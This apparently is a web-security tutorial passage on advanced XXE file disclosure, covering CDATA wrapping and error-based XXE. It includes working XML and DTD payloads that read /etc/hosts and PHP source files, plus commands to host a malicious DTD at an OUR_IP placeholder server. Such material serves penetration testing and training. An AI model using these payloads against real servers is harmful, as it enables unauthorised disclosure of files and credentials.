Not all XXE vulnerabilities may be straightforward to exploit, as we have seen in the previous section. Some file formats may not be readable through basic XXE, while in other cases, the web application may not output any input values in some instances, so we may try to force it through errors.

# Advanced XXE File Disclosure

## 1. CDATA Wrapping (for non-XML-safe content)

**Problem:** Basic XXE breaks when file content contains characters that aren't valid XML (binary data, special chars). PHP filter tricks only help with PHP source files.

**Goal:** Wrap the external file's content in `<![CDATA[ ... ]]>` so the parser treats it as raw data.

**Catch:** XML won't let you directly join an *internal* entity (like CDATA markers) with an *external* entity (the file reference) in the same DTD.

**Fix:** Use **XML Parameter Entities** (`%name;`, DTD-only). When parameter entities are loaded from an external source, they *can* be joined together.

### Workflow
1. Create a `.dtd` file defining three parameter entities: CDATA start, the file reference, and CDATA end — then a joined entity combining them.
2. Host the DTD file on your own server:
```bash
   echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
   python3 -m http.server 8000
```
3. In the target's XML payload, reference your external DTD, trigger the parameter entities (`%xxe;`), then output `&joined;` in the document body.
4. Result: file content is returned wrapped in CDATA — no base64 encoding needed.

### Example payload
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
<email>&joined;</email>
```

> **Note:** Some servers block reading files like `index.php` to prevent XML entity self-reference DoS loops.

---

## 2. Error-Based XXE (blind-ish scenarios)

**When to use:** App doesn't reflect any XML entity values in its output — can't just print file contents directly.

### Step 1 — Confirm error visibility
Send malformed XML (missing/mismatched closing tags, reference to a nonexistent entity) and check if the app leaks PHP/server errors (can reveal server directory structure too).

### Step 2 — Exploit via forced error
Host a DTD defining:
- a parameter entity for the target file, and
- an "error" entity that references a **nonexistent parameter entity** concatenated with the file entity.

Because the nonexistent entity fails, the parser throws an error — and that error message includes the file's content (or path info) as part of the failure text.

### Example DTD payload
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

### Trigger payload
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

**Limitations:** Less reliable than the CDATA method — may hit length limits, and special characters can still break the payload. Useful for reading arbitrary files and source code when other methods fail.